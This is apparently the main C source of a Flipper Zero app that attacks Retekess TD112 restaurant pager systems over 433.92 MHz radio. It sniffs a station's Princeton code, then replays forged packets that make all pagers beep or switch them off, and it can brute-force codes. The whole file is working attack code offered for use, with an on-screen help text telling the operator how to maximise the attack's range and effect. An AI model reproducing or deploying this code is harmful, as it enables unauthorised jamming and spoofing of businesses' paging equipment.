#include "burger_pager.h"
#include "protocols/_protocols.h"

#include <furi.h>
#include <furi_hal.h>
#include <lib/subghz/receiver.h>
#include <lib/subghz/protocols/protocol_items.h>
#include <lib/subghz/protocols/princeton.h>
#include <furi_hal_subghz.h>
#include <notification/notification_messages.h>
#include <core/stream_buffer.h>

#include "helpers/string.h"
#include "helpers/log.h"

#define SEND_ATTACK_DURATION_MS  10000

static Attack attacks[] = {
    {
        .title = "TD112 Call all pagers",
        .text = "Do beep in all undoc pagers",
        .protocol = &protocol_retekess_td112,
        .payload =
            {
                .subghz_protocol = "Princeton",
                .frequency = 433920000,
                .bits = 24,
                .te = 228,
                .repeat = 3,
                .guard_time = 30,
                .cfg.retekess_td112 =
                    {
                        .state = RetekessTd112StateBeep,
                    },
            },
    },
    {
        .title = "TD112 Turn off",
        .text = "Turn off all doc pagers",
        .protocol = &protocol_retekess_td112,
        .payload =
            {
                .subghz_protocol = "Princeton",
                .frequency = 433920000,
                .bits = 24,
                .te = 228,
                .repeat = 3,
                .guard_time = 30,
                .cfg.retekess_td112 =
                    {
                        .state = RetekessTd112StateTurnOff,
                    },
            },
    },
};

#define ATTACKS_COUNT ((signed)COUNT_OF(attacks))

static uint16_t delays[] = {20, 50, 100, 200, 500};

const NotificationSequence solid_message = {
    &message_red_0,
    &message_green_255,
    &message_blue_255,
    &message_do_not_reset,
    &message_delay_10,
    NULL,
};
NotificationMessage blink_message = {
    .type = NotificationMessageTypeLedBlinkStart,
    .data.led_blink.color = LightBlue | LightGreen,
    .data.led_blink.on_time = 10,
    .data.led_blink.period = 100,
};
const NotificationSequence blink_sequence = {
    &blink_message,
    &message_do_not_reset,
    NULL,
};
static void start_blink(State* state) {
    if(!state->ctx.led_indicator) return;
    uint16_t period = delays[state->delay];
    if(period <= 100) period += 30;
    blink_message.data.led_blink.period = period;
    notification_message_block(state->ctx.notification, &blink_sequence);
}
static void stop_blink(State* state) {
    if(!state->ctx.led_indicator) return;
    notification_message_block(state->ctx.notification, &sequence_blink_stop);
}

static void subghz_send_attack(State* state) {
    uint16_t delay = delays[state->delay];
    UNUSED(delay); // @TODO
    Payload* payload = &attacks[state->index].payload;

    const Protocol* protocol = attacks[state->index].protocol;
    furi_assert(protocol != NULL);
    uint8_t size;
    uint8_t* packet;
    protocol->make_packet(&size, &packet, payload);

    FURI_LOG_I(
        LOGGING_TAG,
        "Change SubGHz module Protocol: %s, Bit: %lu, Key: %.*s, TE: %lu, Repeat: %lu",
        payload->subghz_protocol,
        (unsigned long)payload->bits,
        size * 3,
        ({
            static char temp[256];
            for(uint8_t i = 0; i < size; i++) {
                snprintf(&temp[i * 3], sizeof(temp) - i * 3, "%02X ", packet[i]);
            }
            temp;
        }),
        payload->te,
        payload->repeat);

    SubGhzTransmitter* transmitter =
        subghz_transmitter_alloc_init(state->environment, payload->subghz_protocol);
    FlipperFormat* flipper_format = state->flipper_format;
    flipper_format_insert_or_update_string_cstr(flipper_format, "Protocol", "Princeton");
    flipper_format_insert_or_update_uint32(flipper_format, "Bit", &payload->bits, 1);
    flipper_format_insert_or_update_hex(flipper_format, "Key", packet, size);
    flipper_format_insert_or_update_uint32(flipper_format, "TE", &payload->te, 1);
    flipper_format_insert_or_update_uint32(flipper_format, "Repeat", &payload->repeat, 1);
    flipper_format_insert_or_update_uint32(flipper_format, "Guard_time", &payload->guard_time, 1);
    flipper_format_rewind(flipper_format);

    SubGhzProtocolStatus status = subghz_transmitter_deserialize(transmitter, flipper_format);
    furi_assert(status == SubGhzProtocolStatusOk);

    FURI_LOG_D(LOGGING_TAG, "Successfully deserialized");

    subghz_devices_load_preset(state->device, FuriHalSubGhzPresetOok650Async, NULL);
    uint32_t frequency = subghz_devices_set_frequency(state->device, payload->frequency);

    FURI_LOG_D(LOGGING_TAG, "Changed frequency to %lu", frequency);

    furi_hal_power_suppress_charge_enter();

    subghz_devices_start_async_tx(state->device, subghz_transmitter_yield, transmitter);
    subghz_transmitter_free(transmitter);
    free(packet);
}

static void subghz_capture_callback(bool level, uint32_t duration, void* _state) {
    State* state = (State*)_state;
    LevelDuration level_duration = level_duration_make(level, duration);
    furi_stream_buffer_send(state->stream, &level_duration, sizeof(LevelDuration), 0);
}
static void subghz_receiver_callback(
    SubGhzReceiver* receiver,
    SubGhzProtocolDecoderBase* decoder_base,
    void* _state) {
    State* state = (State*)_state;
    Payload* payload = &attacks[state->index].payload;

    if(decoder_base->protocol->type == SubGhzProtocolTypeStatic) {
        FuriString* buffer = furi_string_alloc();
        subghz_protocol_decoder_base_get_string(decoder_base, buffer);
        subghz_receiver_reset(receiver);
        FURI_LOG_I(LOGGING_TAG, "Captured:\r\n%s", furi_string_get_cstr(buffer));

        const uint8_t size = 3;
        uint8_t packet[size];
        memset(packet, 0, size);
        char* key_str = alloc_extract_value_from_string("Key", furi_string_get_cstr(buffer));
        convert_key_to_data(key_str, packet, size);
        UNUSED(key_str);

        FURI_LOG_D(
            LOGGING_TAG,
            "Success parsed captured package to %02X %02X %02X",
            packet[0],
            packet[1],
            packet[2]);

        const Protocol* protocol = attacks[state->index].protocol;
        protocol->process_packet(size, packet, payload);
        state->packet_found = true;
    }
    subghz_receiver_reset(receiver);
}

static int32_t subghz_find_station_thread(void* _state) {
    State* state = _state;
    Payload* payload = &attacks[state->index].payload;

    furi_hal_power_suppress_charge_enter();

    subghz_receiver_set_filter(state->receiver, SubGhzProtocolFlag_Decodable);
    subghz_receiver_set_rx_callback(state->receiver, subghz_receiver_callback, state);

    furi_hal_subghz_reset();
    subghz_devices_load_preset(state->device, FuriHalSubGhzPresetOok650Async, NULL);
    uint32_t frequency = subghz_devices_set_frequency(state->device, payload->frequency);
    FURI_LOG_D(LOGGING_TAG, "Changed frequency to %lu", frequency);

    furi_hal_subghz_start_async_rx(subghz_capture_callback, state);

    FURI_LOG_I(
        LOGGING_TAG,
        "Listening for Princeton %lu-bit signals at %lu",
        payload->bits,
        payload->frequency);

    while(state->find_station_running) {
        LevelDuration level_duration;
        size_t received =
            furi_stream_buffer_receive(state->stream, &level_duration, sizeof(LevelDuration), 100);
        if(received == sizeof(LevelDuration)) {
            bool level = level_duration_get_level(level_duration);
            uint32_t duration = level_duration_get_duration(level_duration);
            subghz_receiver_decode(state->receiver, level, duration);
        }

        if(!state->find_station_running) {
            break;
        }
    }

    furi_hal_subghz_stop_async_rx();
    furi_hal_subghz_sleep();

    return 0;
}

static void stop_attack(State* state) {
    if(state->find_station_thread) {
        state->find_station_running = false;
        furi_thread_join(state->find_station_thread);
        furi_thread_free(state->find_station_thread);
        state->find_station_thread = NULL;
    }
    if(subghz_devices_is_async_complete_tx(state->device)) {
        subghz_devices_stop_async_tx(state->device);
    }
}

static void start_attack(State* state) {
    uint32_t current_time = furi_get_tick();
    uint32_t elapsed_time = current_time - state->last_switch_time;

    if(state->is_find_station) {
        if(state->packet_found) {
            state->packet_found = false;
            if(state->find_station_thread) {
                state->find_station_running = false;
                furi_thread_join(state->find_station_thread);
                furi_thread_free(state->find_station_thread);
                state->find_station_thread = NULL;
            }
            state->is_find_station = false;
            state->last_switch_time = current_time;
        } else {
            if(state->find_station_thread == NULL) {
                state->find_station_running = true;
                state->find_station_thread =
                    furi_thread_alloc_ex("FindStation", 1024, subghz_find_station_thread, state);
                furi_thread_start(state->find_station_thread);
            }
        }
    } else {
        if(elapsed_time >= SEND_ATTACK_DURATION_MS) {
            state->is_find_station = true;
            state->last_switch_time = current_time;
            if(subghz_devices_is_async_complete_tx(state->device)) {
                subghz_devices_stop_async_tx(state->device);
            }
        } else {
            subghz_send_attack(state);
        }
    }
}

static int32_t adv_thread(void* _ctx) {
    State* state = _ctx;
    start_blink(state);
    state->last_switch_time = furi_get_tick();
    state->is_find_station = true;

    while(state->advertising) {
        Payload* payload = &attacks[state->index].payload;
        const Protocol* protocol = attacks[state->index].protocol;

        if(protocol &&
           (payload->mode == PayloadModeBruteforce ||
            payload->mode == PayloadModeFindAndBruteforce) &&
           payload->bruteforce.counter++ >= payload->bruteforce.counter_limit) {
            payload->bruteforce.counter = 0;
            payload->bruteforce.value =
                (payload->bruteforce.value + 1) % (1 << (payload->bruteforce.size * 8));
        }

        start_attack(state);

        if(subghz_devices_is_async_complete_tx(state->device)) {
            subghz_devices_stop_async_tx(state->device);
        }
    }

    stop_attack(state);
    stop_blink(state);
    return 0;
}

static void toggle_adv(State* state) {
    if(state->advertising) {
        state->advertising = false;
        furi_thread_join(state->thread);
    } else {
        state->advertising = true;
        furi_thread_start(state->thread);
    }
}

#define PAGE_MIN (-5)
#define PAGE_MAX ATTACKS_COUNT
enum {
    PageHelpBruteforce = PAGE_MIN,
    PageHelpApps,
    PageHelpDelay,
    PageHelpDistance,
    PageHelpInfoConfig,
    PageStart = 0,
    PageEnd = ATTACKS_COUNT - 1,
    PageAboutCredits = PAGE_MAX,
};

static void draw_callback(Canvas* canvas, void* _ctx) {
    State* state = *(State**)_ctx;
    const char* back = "Back";
    const char* next = "Next";
    if(state->index < 0) {
        back = "Next";
        next = "Back";
    }
    switch(state->index) {
    case PageStart - 1:
        next = "Spam";
        break;
    case PageStart:
        back = "Help";
        break;
    case PageEnd:
        next = "About";
        break;
    case PageEnd + 1:
        back = "Spam";
        break;
    }

    const Attack* attack =
        (state->index >= 0 && state->index <= ATTACKS_COUNT - 1) ? &attacks[state->index] : NULL;
    const Payload* payload = attack ? &attack->payload : NULL;
    const Protocol* protocol = attack ? attack->protocol : NULL;

    canvas_set_font(canvas, FontSecondary);
    const Icon* icon = protocol ? protocol->icon : &I_burger_pager;
    canvas_draw_icon(canvas, 4 - (icon == &I_burger_pager), 3, icon);
    canvas_draw_str(canvas, 14, 12, "BLE Spam");

    switch(state->index) {
    case PageHelpBruteforce:
        canvas_set_font(canvas, FontBatteryPercent);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Bruteforce\e# cycles codes\n"
            "to find popups, hold left and\n"
            "right to send manually and\n"
            "change delay",
            false);
        break;
    case PageHelpApps:
        canvas_set_font(canvas, FontBatteryPercent);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Some Apps\e# interfere\n"
            "with the attacks, stay on\n"
            "homescreen for best results",
            false);
        break;
    case PageHelpDelay:
        canvas_set_font(canvas, FontBatteryPercent);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Delay\e# is time between\n"
            "attack attempts (top right),\n"
            "keep 20ms for best results",
            false);
        break;
    case PageHelpDistance:
        canvas_set_font(canvas, FontBatteryPercent);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Distance\e# varies greatly:\n"
            "some are long range (>30 m)\n"
            "others are close range (<1 m)",
            false);
        break;
    case PageHelpInfoConfig:
        canvas_set_font(canvas, FontBatteryPercent);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "See \e#more info\e# and change\n"
            "attack \e#options\e# by holding\n"
            "Ok on each attack page",
            false);
        break;
    case PageAboutCredits:
        canvas_set_font(canvas, FontBatteryPercent);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Credits");
        elements_text_box(
            canvas,
            4,
            16,
            122,
            48,
            AlignLeft,
            AlignTop,
            "App+Spam: \e#WillyJL\e# MNTM\n"
            "Apple+Crash: \e#ECTO-1A\e#\n"
            "Android+Win: \e#Spooks4576\e#\n"
            "                                   Version \e#" FAP_VERSION "\e#",
            false);
        break;
    default: {
        if(!attack) break;
        if(state->ctx.lock_keyboard && !state->advertising) {
            // Forgive me Lord for I have sinned by handling state in draw
            toggle_adv(state);
        }
        char str[32];

        canvas_set_font(canvas, FontBatteryPercent);
        if(payload->mode == PayloadModeBruteforce) {
            snprintf(
                str,
                sizeof(str),
                "0x%0*lX",
                payload->bruteforce.size * 2,
                payload->bruteforce.value);
        } else {
            snprintf(str, sizeof(str), "%ims", delays[state->delay]);
        }
        canvas_draw_str_aligned(canvas, 116, 12, AlignRight, AlignBottom, str);
        canvas_draw_icon(canvas, 119, 6, &I_SmallArrowUp_3x5);
        canvas_draw_icon(canvas, 119, 10, &I_SmallArrowDown_3x5);

        canvas_set_font(canvas, FontBatteryPercent);
        if(payload->mode == PayloadModeBruteforce) {
            canvas_draw_str_aligned(canvas, 64, 22, AlignCenter, AlignBottom, "Bruteforce");
            if(delays[state->delay] < 100) {
                snprintf(str, sizeof(str), "%ims>", delays[state->delay]);
            } else {
                snprintf(str, sizeof(str), "%.1fs>", (double)delays[state->delay] / 1000);
            }
            uint16_t w = canvas_string_width(canvas, str);
            elements_slightly_rounded_box(canvas, 3, 14, 30, 10);
            elements_slightly_rounded_box(canvas, 119 - w, 14, 6 + w, 10);
            canvas_invert_color(canvas);
            canvas_draw_str_aligned(canvas, 5, 22, AlignLeft, AlignBottom, "<Send");
            canvas_draw_str_aligned(canvas, 122, 22, AlignRight, AlignBottom, str);
            canvas_invert_color(canvas);
        } else {
            snprintf(
                str,
                sizeof(str),
                "%02i/%02i: %s",
                state->index + 1,
                ATTACKS_COUNT,
                protocol ? protocol->get_name(payload) : "Everything AND");
            canvas_draw_str(canvas, 4 - (state->index < 19 ? 1 : 0), 22, str);
        }

        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 4, 33, attack->title);

        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 4, 46, attack->text);

        elements_button_center(canvas, state->advertising ? "Stop" : "Start");
        break;
    }
    }

    if(state->index > PAGE_MIN) {
        elements_button_left(canvas, back);
    }
    if(state->index < PAGE_MAX) {
        elements_button_right(canvas, next);
    }

    if(state->lock_warning) {
        canvas_set_font(canvas, FontSecondary);
        elements_bold_rounded_frame(canvas, 14, 8, 99, 48);
        elements_multiline_text(canvas, 65, 26, "To unlock\npress:");
        canvas_draw_icon(canvas, 65, 42, &I_Pin_back_arrow_10x8);
        canvas_draw_icon(canvas, 80, 42, &I_Pin_back_arrow_10x8);
        canvas_draw_icon(canvas, 95, 42, &I_Pin_back_arrow_10x8);
        canvas_draw_icon(canvas, 16, 13, &I_WarningDolphin_45x42);
        canvas_draw_dot(canvas, 17, 61);
    }
}

static bool input_callback(InputEvent* input, void* _ctx) {
    View* view = _ctx;
    State* state = *(State**)view_get_model(view);
    bool consumed = false;

    if(state->ctx.lock_keyboard) {
        consumed = true;
        state->lock_warning = true;
        if(state->lock_count == 0) {
            furi_timer_set_thread_priority(FuriTimerThreadPriorityElevated);
            furi_timer_start(state->lock_timer, 1000);
        }
        if(input->type == InputTypeShort && input->key == InputKeyBack) {
            state->lock_count++;
        }
        if(state->lock_count >= 3) {
            furi_timer_set_thread_priority(FuriTimerThreadPriorityElevated);
            furi_timer_start(state->lock_timer, 1);
        }
    } else if(
        input->type == InputTypeShort || input->type == InputTypeLong ||
        input->type == InputTypeRepeat) {
        consumed = true;

        bool is_attack = state->index >= 0 && state->index <= ATTACKS_COUNT - 1;
        Payload* payload = is_attack ? &attacks[state->index].payload : NULL;
        bool advertising = state->advertising;

        switch(input->key) {
        case InputKeyOk:
            if(is_attack) {
                if(input->type == InputTypeLong) {
                    if(advertising) toggle_adv(state);
                    state->ctx.attack = &attacks[state->index];
                    scene_manager_set_scene_state(state->ctx.scene_manager, SceneConfig, 0);
                    view_commit_model(view, consumed);
                    scene_manager_next_scene(state->ctx.scene_manager, SceneConfig);
                    return consumed;
                } else if(input->type == InputTypeShort) {
                    toggle_adv(state);
                }
            }
            break;
        case InputKeyUp:
            if(is_attack) {
                if(payload->mode == PayloadModeBruteforce) {
                    payload->bruteforce.counter = 0;
                    payload->bruteforce.value =
                        (payload->bruteforce.value + 1) % (1 << (payload->bruteforce.size * 8));
                } else if(state->delay < COUNT_OF(delays) - 1) {
                    state->delay++;
                    if(advertising) start_blink(state);
                }
            }
            break;
        case InputKeyDown:
            if(is_attack) {
                if(payload->mode == PayloadModeBruteforce) {
                    payload->bruteforce.counter = 0;
                    payload->bruteforce.value =
                        (payload->bruteforce.value - 1) % (1 << (payload->bruteforce.size * 8));
                } else if(state->delay > 0) {
                    state->delay--;
                    if(advertising) start_blink(state);
                }
            }
            break;
        case InputKeyLeft:
            if(input->type == InputTypeLong) {
                state->ignore_bruteforce = payload ? (payload->mode != PayloadModeBruteforce) :
                                                     true;
            }
            if(input->type == InputTypeShort || !is_attack || state->ignore_bruteforce ||
               payload->mode != PayloadModeBruteforce) {
                if(state->index > PAGE_MIN) {
                    if(advertising) toggle_adv(state);
                    state->index--;
                }
            } else {
                if(!advertising) {
                    if(subghz_devices_is_async_complete_tx(state->device)) {
                        subghz_devices_stop_async_tx(state->device);
                    }

                    start_attack(state);

                    if(state->ctx.led_indicator)
                        notification_message(state->ctx.notification, &solid_message);
                    furi_delay_ms(10);
                    subghz_devices_stop_async_tx(state->device);

                    if(state->ctx.led_indicator)
                        notification_message_block(state->ctx.notification, &sequence_reset_rgb);
                }
            }
            break;
        case InputKeyRight:
            if(input->type == InputTypeLong) {
                state->ignore_bruteforce = payload ? (payload->mode != PayloadModeBruteforce) :
                                                     true;
            }
            if(input->type == InputTypeShort || !is_attack || state->ignore_bruteforce ||
               payload->mode != PayloadModeBruteforce) {
                if(state->index < PAGE_MAX) {
                    if(advertising) toggle_adv(state);
                    state->index++;
                }
            } else if(input->type == InputTypeLong) {
                state->delay = (state->delay + 1) % COUNT_OF(delays);
                if(advertising) start_blink(state);
            }
            break;
        case InputKeyBack:
            if(advertising) toggle_adv(state);
            consumed = false;
            break;
        default:
            break;
        }
    }

    view_commit_model(view, consumed);
    return consumed;
}

static void lock_timer_callback(void* _ctx) {
    State* state = _ctx;
    if(state->lock_count < 3) {
        notification_message_block(state->ctx.notification, &sequence_display_backlight_off);
    } else {
        state->ctx.lock_keyboard = false;
    }
    with_view_model(state->main_view, State * *model, { (*model)->lock_warning = false; }, true);
    state->lock_count = 0;
    furi_timer_set_thread_priority(FuriTimerThreadPriorityNormal);
}

static bool custom_event_callback(void* _ctx, uint32_t event) {
    State* state = _ctx;
    return scene_manager_handle_custom_event(state->ctx.scene_manager, event);
}

static void tick_event_callback(void* _ctx) {
    State* state = _ctx;
    bool advertising;
    with_view_model(
        state->main_view, State * *model, { advertising = (*model)->advertising; }, advertising);
    scene_manager_handle_tick_event(state->ctx.scene_manager);
}

static bool back_event_callback(void* _ctx) {
    State* state = _ctx;
    return scene_manager_handle_back_event(state->ctx.scene_manager);
}

int32_t init_subghz(State* state) {
    subghz_devices_init();
    state->device = subghz_devices_get_by_name(SUBGHZ_DEVICE_CC1101_INT_NAME);
    furi_assert(state->device != NULL);
    subghz_devices_begin(state->device);
    subghz_devices_reset(state->device);
    if(subghz_devices_is_async_complete_tx(state->device)) {
        subghz_devices_stop_async_tx(state->device);
    }

    state->environment = subghz_environment_alloc();
    furi_assert(state->environment != NULL);
    state->flipper_format = flipper_format_string_alloc();
    furi_assert(state->flipper_format != NULL);

    state->stream = furi_stream_buffer_alloc(sizeof(LevelDuration) * 1024, sizeof(LevelDuration));
    subghz_environment_set_protocol_registry(state->environment, &subghz_protocol_registry);
    state->receiver = subghz_receiver_alloc_init(state->environment);

    return 0;
}

int32_t subghz_free(State* state) {
    subghz_devices_sleep(state->device);
    subghz_devices_end(state->device);

    subghz_devices_deinit();

    furi_hal_power_suppress_charge_exit();

    flipper_format_free(state->flipper_format);
    subghz_environment_free(state->environment);

    subghz_receiver_free(state->receiver);
    furi_stream_buffer_free(state->stream);

    return 0;
}
int32_t state_free(State* state) {
    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewByteInput);
    byte_input_free(state->ctx.byte_input);

    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewIntInput);
    int_input_free(state->ctx.int_input);

    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewSubmenu);
    submenu_free(state->ctx.submenu);

    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewTextInput);
    text_input_free(state->ctx.text_input);

    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewVariableItemList);
    variable_item_list_free(state->ctx.variable_item_list);

    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewMain);
    view_free(state->main_view);

    scene_manager_free(state->ctx.scene_manager);
    view_dispatcher_free(state->ctx.view_dispatcher);
    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_NOTIFICATION);

    furi_timer_free(state->lock_timer);
    furi_thread_free(state->thread);

    subghz_free(state);
    free(state);

    return 0;
}
int32_t burger_pager(void* p) {
    UNUSED(p);
    State* state = calloc(1, sizeof(State));
    furi_assert(state != NULL);

    init_subghz(state);

    state->thread = furi_thread_alloc();
    furi_thread_set_callback(state->thread, adv_thread);
    furi_thread_set_context(state->thread, state);
    furi_thread_set_stack_size(state->thread, 2048);
    state->ctx.led_indicator = true;
    state->lock_timer = furi_timer_alloc(lock_timer_callback, FuriTimerTypeOnce, state);
    state->last_switch_time = furi_get_tick();
    state->is_find_station = true;

    state->ctx.notification = furi_record_open(RECORD_NOTIFICATION);
    Gui* gui = furi_record_open(RECORD_GUI);
    state->ctx.view_dispatcher = view_dispatcher_alloc();

    view_dispatcher_set_event_callback_context(state->ctx.view_dispatcher, state);
    view_dispatcher_set_custom_event_callback(state->ctx.view_dispatcher, custom_event_callback);
    view_dispatcher_set_tick_event_callback(state->ctx.view_dispatcher, tick_event_callback, 100);
    view_dispatcher_set_navigation_event_callback(state->ctx.view_dispatcher, back_event_callback);
    state->ctx.scene_manager = scene_manager_alloc(&scene_handlers, &state->ctx);

    state->main_view = view_alloc();
    view_allocate_model(state->main_view, ViewModelTypeLocking, sizeof(State*));
    with_view_model(state->main_view, State * *model, { *model = state; }, false);
    view_set_context(state->main_view, state->main_view);
    view_set_draw_callback(state->main_view, draw_callback);
    view_set_input_callback(state->main_view, input_callback);
    view_dispatcher_add_view(state->ctx.view_dispatcher, ViewMain, state->main_view);

    state->ctx.byte_input = byte_input_alloc();
    view_dispatcher_add_view(
        state->ctx.view_dispatcher, ViewByteInput, byte_input_get_view(state->ctx.byte_input));

    state->ctx.int_input = int_input_alloc();
    view_dispatcher_add_view(
        state->ctx.view_dispatcher, ViewIntInput, int_input_get_view(state->ctx.int_input));

    state->ctx.submenu = submenu_alloc();
    view_dispatcher_add_view(
        state->ctx.view_dispatcher, ViewSubmenu, submenu_get_view(state->ctx.submenu));

    state->ctx.text_input = text_input_alloc();
    view_dispatcher_add_view(
        state->ctx.view_dispatcher, ViewTextInput, text_input_get_view(state->ctx.text_input));

    state->ctx.variable_item_list = variable_item_list_alloc();
    view_dispatcher_add_view(
        state->ctx.view_dispatcher,
        ViewVariableItemList,
        variable_item_list_get_view(state->ctx.variable_item_list));

    view_dispatcher_attach_to_gui(state->ctx.view_dispatcher, gui, ViewDispatcherTypeFullscreen);
    scene_manager_next_scene(state->ctx.scene_manager, SceneMain);
    view_dispatcher_run(state->ctx.view_dispatcher);

    state_free(state);

    return 0;
}
